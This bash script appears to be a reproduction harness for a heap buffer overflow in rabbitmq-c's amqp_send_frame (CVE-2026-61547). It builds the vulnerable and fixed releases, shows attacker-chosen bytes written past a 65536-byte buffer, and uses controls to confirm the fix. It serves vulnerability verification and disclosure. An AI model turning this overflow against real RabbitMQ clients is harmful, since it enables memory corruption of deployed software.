#!/usr/bin/env bash
# Real-upstream rabbitmq-c CVE-2026-61547 harness.
# Compiles the pinned v0.16.0 / v0.17.0 librabbitmq sources verbatim (cmake,
# no source edits) and calls the public amqp_send_frame() API. Rung 4 uses a
# harness allocator interposer to place the library's real outbound frame
# buffer in page-aligned memory; it changes placement, never library code.
# No broker, no external host, no network beyond a local AF_UNIX socketpair.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

rm -rf "$OUT/v16" "$OUT/v17" "$OUT/b16" "$OUT/b16p" "$OUT/b17p"
mkdir -p "$OUT/v16" "$OUT/v17"
tar -xzf "$HERE/src/0.16.0.tar.gz" -C "$OUT/v16" --strip-components=1 || exit 2
tar -xzf "$HERE/src/0.17.0.tar.gz" -C "$OUT/v17" --strip-components=1 || exit 2

cmake -S "$OUT/v16" -B "$OUT/b16" -G Ninja -DBUILD_TESTING=OFF \
  -DBUILD_TOOLS=OFF -DBUILD_EXAMPLES=OFF -DBUILD_SHARED_LIBS=OFF \
  -DENABLE_SSL_SUPPORT=OFF -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_COMPILER=gcc \
  -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address -fno-omit-frame-pointer" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" > "$OUT/cmake16.log" 2>&1 || exit 2
cmake --build "$OUT/b16" -j4 >> "$OUT/cmake16.log" 2>&1 || exit 2
for V in 16 17; do
  cmake -S "$OUT/v$V" -B "$OUT/b${V}p" -G Ninja -DBUILD_TESTING=OFF \
    -DBUILD_TOOLS=OFF -DBUILD_EXAMPLES=OFF -DBUILD_SHARED_LIBS=OFF \
    -DENABLE_SSL_SUPPORT=OFF -DCMAKE_BUILD_TYPE=Debug > "$OUT/cmake${V}p.log" 2>&1 || exit 2
  cmake --build "$OUT/b${V}p" -j4 >> "$OUT/cmake${V}p.log" 2>&1 || exit 2
done

I16="-DAMQP_STATIC -DHAVE_CONFIG_H -I$OUT/v16/include -I$OUT/b16/include \
-I$OUT/b16p/include -I$OUT/b16p/librabbitmq -I$OUT/v16/librabbitmq"
I17="-DAMQP_STATIC -DHAVE_CONFIG_H -I$OUT/v17/include -I$OUT/b17p/include \
-I$OUT/b17p/librabbitmq -I$OUT/v17/librabbitmq"
CFLAGS="-Wno-deprecated-declarations"
gcc $CFLAGS -g -O1 -fsanitize=address -fno-omit-frame-pointer $I16 \
  "$HERE/driver.c" "$OUT/b16/librabbitmq/librabbitmq.a" -o "$OUT/v16_asan" || exit 2
gcc $CFLAGS -g -O1 $I16 "$HERE/driver.c" \
  "$OUT/b16p/librabbitmq/librabbitmq.a" -o "$OUT/v16_plain" || exit 2
gcc $CFLAGS -g -O1 -DALLOC_INTERPOSER $I16 "$HERE/driver.c" \
  "$OUT/b16p/librabbitmq/librabbitmq.a" \
  -Wl,--wrap=realloc,--wrap=free -o "$OUT/v16_readback" || exit 2
gcc $CFLAGS -g -O1 -DALLOC_INTERPOSER $I16 "$HERE/driver.c" \
  "$OUT/b16p/librabbitmq/librabbitmq.a" \
  -Wl,--wrap=realloc,--wrap=free -o "$OUT/v16_guard" || exit 2
gcc $CFLAGS -g -O1 -fsanitize=address -fno-omit-frame-pointer $I17 \
  "$HERE/driver.c" "$OUT/b17p/librabbitmq/librabbitmq.a" -o "$OUT/v17_asan" || exit 2

export ASAN_OPTIONS=abort_on_error=0:detect_leaks=0
pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

# Rung 1: the public API accepts the oversized body and the unsanitized
# library crashes in the real memcpy (no ASan, no staged allocator).
( $OUT/v16_plain plain 200000 5a > "$OUT/plain.log" 2>&1 )
prc=$?
check "rung1 real amqp_send_frame crash on unsanitized v0.16.0" \
  "$([ "$prc" -eq 139 ] && echo 1 || echo 0)"

# Rung 2: the declared body length, not the buffer capacity, drives the copy.
rb=$($OUT/v16_readback readback 200000 5a); echo "$rb"
check "rung2 chosen 0x5a at +65536/+65552/+65584/+65600/+65792/+66048/+67584/+69632" \
  "$(contains '+65536=5a+65552=5a+65584=5a+65600=5a+65792=5a+66048=5a+67584=5a+69632=5a' "$rb" && echo 1 || echo 0)"
rb2=$($OUT/v16_readback readback 200000 a5); echo "$rb2"
check "second chosen value 0xa5, not a fixed marker" \
  "$(contains '+65536=a5+65552=a5+65584=a5+65600=a5+65792=a5+66048=a5+67584=a5+69632=a5' "$rb2" && echo 1 || echo 0)"

# Rung 3: ASan report names the real library copy and the real public call
# chain. Trace lines are normalized below (no PID/address/path text).
$OUT/v16_asan asan 200000 5a > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 200000' "$ac" &&
contains 'amqp_frame_to_bytes' "$ac" &&
contains 'amqp_connection.c:467' "$ac" &&
contains 'amqp_send_frame_inner' "$ac" &&
contains 'amqp_connection.c:548' "$ac" &&
contains 'amqp_send_frame' "$ac" &&
contains '0 bytes after 65536-byte region' "$ac" &&
contains 'amqp_tune_connection' "$ac" &&
contains 'amqp_connection.c:140' "$ac" && ok=1
check "rung3 ASan WRITE from pinned amqp_connection.c:467 via public amqp_send_frame" "$ok"

$OUT/v16_asan asan 1000000 5a > "$OUT/asan_max.log" 2>&1
am=$(cat "$OUT/asan_max.log")
check "larger chosen count writes 1000000 bytes (934464 past the buffer)" \
  "$(contains 'WRITE of size 1000000' "$am" && contains '0 bytes after 65536-byte region' "$am" && echo 1 || echo 0)"

# Rung 4: first past-end store meets PROT_NONE in the staged build.
( $OUT/v16_guard guard 200000 5a > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page faults at the first past-end store" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Negative controls: fixed release rejects before the copy; small body clean.
fc=$($OUT/v17_asan fixed 200000 5a 2>&1); echo "$fc"
check "fixed v0.17.0 returns BAD_AMQP_DATA (rc=-2) with no ASan report" \
  "$(contains 'value=5a rc=-2' "$fc" && ! contains 'AddressSanitizer' "$fc" && echo 1 || echo 0)"
fi=$($OUT/v16_asan asan 2 5a 2>&1); echo "$fi"
check "vulnerable build accepts a body that fits, ASan clean" \
  "$(contains 'len=2 value=5a' "$fi" && ! contains 'AddressSanitizer' "$fi" && echo 1 || echo 0)"
fb=$($OUT/v17_asan fixed 2 5a 2>&1); echo "$fb"
check "fixed build accepts a body that fits, ASan clean" \
  "$(contains 'len=2 value=5a' "$fb" && ! contains 'AddressSanitizer' "$fb" && echo 1 || echo 0)"

# Determinism: two independent five-run groups. Lines carry offsets/values
# only, so the digest is byte-identical across machines and rebuilds.
group() {
  for i in 1 2 3 4 5; do
    $OUT/v16_readback readback 200000 5a
    $OUT/v16_readback readback 200000 a5
    $OUT/v16_readback readback 200000 77
  done | sed 's/ rc=-9$/ rc=OK/'
}
h1=$(group | sha256sum | cut -d' ' -f1)
h2=$(group | sha256sum | cut -d' ' -f1)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism: two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
